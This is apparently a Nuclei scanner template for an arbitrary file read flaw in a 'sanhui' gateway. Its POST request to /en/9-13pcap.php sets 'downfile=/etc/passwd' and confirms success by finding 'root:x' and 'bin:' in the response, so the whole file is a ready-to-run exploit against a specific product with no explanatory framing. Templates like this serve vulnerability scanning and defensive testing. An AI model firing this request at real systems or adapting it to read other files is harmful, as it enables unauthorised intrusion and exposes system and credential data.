id: sanhui-gateway-9-13pcap-ReadAnyFile

info:
  name: sanhui-gateway-9-13pcap-ReadAnyFile
  author: iSee857
  severity: High
  description: sanhui-gateway-9-13pcap-ReadAnyFile
  reference: 
    - https://github.com/iSee857
  tags: readAnyFile,sanhui,gateway

http:
  - method: POST
    path:
      - "{{BaseURL}}/en/9-13pcap.php"

    headers:
      Host: "{{Host}}"
      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0"
      Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8"
      Accept-Encoding: "gzip, deflate, br"
      Accept-Language: "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2"
      Connection: "keep-alive"
      Content-Type: "application/x-www-form-urlencoded"
      Upgrade-Insecure-Requests: "1"


    body: "down=1&downfile=/etc/passwd"

    matchers:
      - type: word
        words:
          - "root:x"
          - "bin:"          
        part: body
        condition: and

      - type: status
        status:
          - 200    

    matchers-condition: and
    redirects: false
    max-redirects: 0
    cookie-reuse: true
    unsafe: true            
    max-size: 2048           